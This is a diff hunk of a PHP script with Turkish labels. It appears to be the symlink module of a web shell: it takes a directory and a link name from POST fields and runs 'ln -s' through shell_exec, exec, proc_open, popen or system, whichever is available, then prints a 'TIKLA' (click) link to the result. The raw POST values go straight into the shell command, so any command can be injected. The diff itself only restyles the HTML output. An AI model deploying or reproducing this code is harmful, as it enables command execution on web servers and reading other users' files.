@@ -37,28 +37,28 @@ $m = $_POST["method"];
 $d = $_POST["dizin"];
 if (function_exists('shell_exec'))
     {
-        echo '<pre>'.shell_exec("ln -s ".$d." ".$m) . '</pre>';
-        echo '<pre><a href="'.$m.'">TIKLA</a></pre>';
+        echo ''.shell_exec("ln -s ".$d." ".$m) . '';
+        echo '<pre><a href="'.$m.'"><h2>TIKLA</h2></a></pre>';
     }
     elseif (function_exists('exec'))
     {
-        echo '<pre>'. exec("ln -s ".$d." ".$m) . '</pre>';
-        echo '<pre><a href="'.$m.'">TIKLA</a></pre>';
+        echo ''. exec("ln -s ".$d." ".$m) . '';
+        echo '<pre><a href="'.$m.'"><h2>TIKLA</h2></a></pre>';
     }
     elseif (function_exists('proc_open'))
     {
-        echo '<pre>'.proc_open("ln -s ".$d." ".$m) . '</pre>';
-        echo '<pre><a href="'.$m.'">TIKLA</a></pre>';
+        echo ''.proc_open("ln -s ".$d." ".$m) . '';
+        echo '<pre><a href="'.$m.'"><h2>TIKLA</h2></a></pre>';
     }
     elseif (function_exists(popen))
     {
-        echo '<pre>'.popen("ln -s ".$d." ".$m) . '</pre>';
-        echo '<pre><a href="'.$m.'">TIKLA</a></pre>';
+        echo ''.popen("ln -s ".$d." ".$m) . '';
+        echo '<pre><a href="'.$m.'"><h2>TIKLA</h2></a></pre>';
     }
     else
     {
-        echo '<pre>'. system("ln -s ".$d." ".$m) . '</pre>';
-        echo '<pre><a href="'.$m.'">TIKLA</a></pre>';
+        echo ''. system("ln -s ".$d." ".$m) . '';
+        echo '<pre><a href="'.$m.'"><h2>TIKLA</h2></a></pre>';
     }
 }
 ?>
